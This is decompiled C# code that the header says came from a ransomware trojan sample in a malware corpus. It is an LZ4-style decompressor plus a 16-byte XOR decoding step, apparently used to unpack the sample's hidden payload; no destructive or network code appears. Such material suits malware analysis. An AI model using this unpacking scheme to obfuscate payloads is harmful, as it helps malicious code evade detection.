// Decompiled with JetBrains decompiler
// Type: sweg
// Assembly: zemra, Version=0.0.3.2, Culture=neutral, PublicKeyToken=null
// MVID: 8277C827-F324-4EBF-91CA-C8DDA795FE5A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.cdih-80c44cfc0d2be543a68554b54d89986fa55caf92a359ef654c46770f42bb29ca.exe

using System;

public class sweg
{
  private const int STEPSIZE = 8;
  public const int COPYLENGTH = 8;
  public const int ML_BITS = 4;
  public const uint ML_MASK = 15;
  public const int RUN_BITS = 4;
  public const uint RUN_MASK = 15;
  private static readonly sbyte[] m_DecArray = new sbyte[8]
  {
    (sbyte) 0,
    (sbyte) 3,
    (sbyte) 2,
    (sbyte) 3,
    (sbyte) 0,
    (sbyte) 0,
    (sbyte) 0,
    (sbyte) 0
  };
  private static readonly sbyte[] m_Dec2table = new sbyte[8]
  {
    (sbyte) 0,
    (sbyte) 0,
    (sbyte) 0,
    (sbyte) -1,
    (sbyte) 0,
    (sbyte) 1,
    (sbyte) 2,
    (sbyte) 3
  };

  public static byte[] go(byte[] compressed)
  {
    int length1 = compressed.Length;
    byte[] numArray1;
    int length2;
    do
    {
      length1 *= 4;
      numArray1 = new byte[length1];
      length2 = sweg.Decompress(compressed, numArray1, compressed.Length);
    }
    while (length2 < 0 || numArray1.Length < length2);
    byte[] numArray2 = new byte[length2];
    Buffer.BlockCopy((Array) numArray1, 0, (Array) numArray2, 0, numArray2.Length);
    byte[] dst = new byte[numArray2.Length - 16];
    Buffer.BlockCopy((Array) numArray2, 16, (Array) dst, 0, dst.Length);
    for (int index = 0; index < dst.Length; ++index)
      dst[index] ^= numArray2[index % 16];
    return dst;
  }

  public static unsafe void CopyMemory(byte* dst, byte* src, long length)
  {
    for (; length >= 16L; length -= 16L)
    {
      *(long*) dst = *(long*) src;
      dst += 8;
      src += 8;
      *(long*) dst = *(long*) src;
      dst += 8;
      src += 8;
    }
    if (length >= 8L)
    {
      *(long*) dst = *(long*) src;
      dst += 8;
      src += 8;
      length -= 8L;
    }
    if (length >= 4L)
    {
      *(int*) dst = (int) *(uint*) src;
      dst += 4;
      src += 4;
      length -= 4L;
    }
    if (length >= 2L)
    {
      *(short*) dst = (short) *(ushort*) src;
      dst += 2;
      src += 2;
      length -= 2L;
    }
    if (length == 0L)
      return;
    *dst = *src;
  }

  public static unsafe int Decompress(
    byte[] compressedBuffer,
    byte[] decompressedBuffer,
    int compressedSize)
  {
    fixed (byte* compressedBuffer1 = compressedBuffer)
      fixed (byte* decompressedBuffer1 = decompressedBuffer)
        return sweg.Decompress(compressedBuffer1, decompressedBuffer1, compressedSize, decompressedBuffer.Length);
  }

  public static unsafe int Decompress(
    byte[] compressedBuffer,
    int compressedPosition,
    byte[] decompressedBuffer,
    int decompressedPosition,
    int compressedSize)
  {
    fixed (byte* compressedBuffer1 = &compressedBuffer[compressedPosition])
      fixed (byte* decompressedBuffer1 = &decompressedBuffer[decompressedPosition])
        return sweg.Decompress(compressedBuffer1, decompressedBuffer1, compressedSize, decompressedBuffer.Length);
  }

  public static unsafe int Decompress(
    byte* compressedBuffer,
    byte* decompressedBuffer,
    int compressedSize,
    int maxDecompressedSize)
  {
    fixed (sbyte* numPtr1 = sweg.m_DecArray)
      fixed (sbyte* numPtr2 = sweg.m_Dec2table)
      {
        byte* src = compressedBuffer;
        byte* numPtr3 = src + compressedSize;
        byte* dst = decompressedBuffer;
        byte* numPtr4 = dst + maxDecompressedSize;
        while (src < numPtr3)
        {
          byte num1 = *src++;
          int length;
          if ((length = (int) num1 >> 4) == 15)
          {
            int num2 = (int) byte.MaxValue;
            while (src < numPtr3 && num2 == (int) byte.MaxValue)
            {
              num2 = (int) *src++;
              length += num2;
            }
          }
          byte* numPtr5 = dst + length;
          if (numPtr5 > numPtr4 - 8 || src + length > numPtr3 - 8)
          {
            if (numPtr5 <= numPtr4 && src + length <= numPtr3)
            {
              sweg.CopyMemory(dst, src, (long) length);
              dst += length;
              src += length;
              if (src >= numPtr3)
                break;
            }
          }
          else
          {
            do
            {
              *(long*) dst = *(long*) src;
              dst += 8;
              src += 8;
            }
            while (dst < numPtr5);
            byte* numPtr6 = src - (dst - numPtr5);
            byte* numPtr7 = numPtr5;
            byte* numPtr8 = numPtr5 - (int) *(ushort*) numPtr6;
            src = numPtr6 + 2;
            if (numPtr8 >= decompressedBuffer)
            {
              int num3;
              if ((num3 = (int) num1 & 15) == 15)
              {
                while (src < numPtr3)
                {
                  int num4 = (int) *src++;
                  num3 += num4;
                  if (num4 != (int) byte.MaxValue)
                    break;
                }
              }
              byte* numPtr9;
              byte* numPtr10;
              if (numPtr7 - numPtr8 < 8L)
              {
                sbyte num5 = numPtr2[numPtr7 - numPtr8];
                byte* numPtr11 = numPtr7;
                byte* numPtr12 = numPtr11 + 1;
                byte* numPtr13 = numPtr8;
                byte* numPtr14 = numPtr13 + 1;
                int num6 = (int) *numPtr13;
                *numPtr11 = (byte) num6;
                byte* numPtr15 = numPtr12;
                byte* numPtr16 = numPtr15 + 1;
                byte* numPtr17 = numPtr14;
                byte* numPtr18 = numPtr17 + 1;
                int num7 = (int) *numPtr17;
                *numPtr15 = (byte) num7;
                byte* numPtr19 = numPtr16;
                byte* numPtr20 = numPtr19 + 1;
                byte* numPtr21 = numPtr18;
                byte* numPtr22 = numPtr21 + 1;
                int num8 = (int) *numPtr21;
                *numPtr19 = (byte) num8;
                byte* numPtr23 = numPtr20;
                byte* numPtr24 = numPtr23 + 1;
                byte* numPtr25 = numPtr22;
                byte* numPtr26 = numPtr25 + 1;
                int num9 = (int) *numPtr25;
                *numPtr23 = (byte) num9;
                byte* numPtr27 = numPtr26 - (int) numPtr1[numPtr24 - numPtr26];
                *(int*) numPtr24 = (int) *(uint*) numPtr27;
                numPtr9 = numPtr24 + 4;
                numPtr10 = numPtr27 - (int) num5;
              }
              else
              {
                *(long*) numPtr7 = *(long*) numPtr8;
                numPtr9 = numPtr7 + 8;
                numPtr10 = numPtr8 + 8;
              }
              byte* numPtr28 = numPtr9 + num3 - 4;
              if (numPtr28 > numPtr4 - 8)
              {
                if (numPtr28 <= numPtr4)
                {
                  if (numPtr9 < numPtr4 - 8)
                  {
                    do
                    {
                      *(long*) numPtr9 = *(long*) numPtr10;
                      numPtr9 += 8;
                      numPtr10 += 8;
                    }
                    while (numPtr9 < numPtr4 - 8);
                  }
                  while (numPtr9 < numPtr28)
                    *numPtr9++ = *numPtr10++;
                  dst = numPtr28;
                  if (dst != numPtr4)
                    continue;
                }
              }
              else
              {
                if (numPtr9 < numPtr28)
                {
                  do
                  {
                    *(long*) numPtr9 = *(long*) numPtr10;
                    numPtr9 += 8;
                    numPtr10 += 8;
                  }
                  while (numPtr9 < numPtr28);
                }
                dst = numPtr28;
                continue;
              }
            }
          }
          return (int) -(src - compressedBuffer);
        }
        return (int) (dst - decompressedBuffer);
      }
  }
}
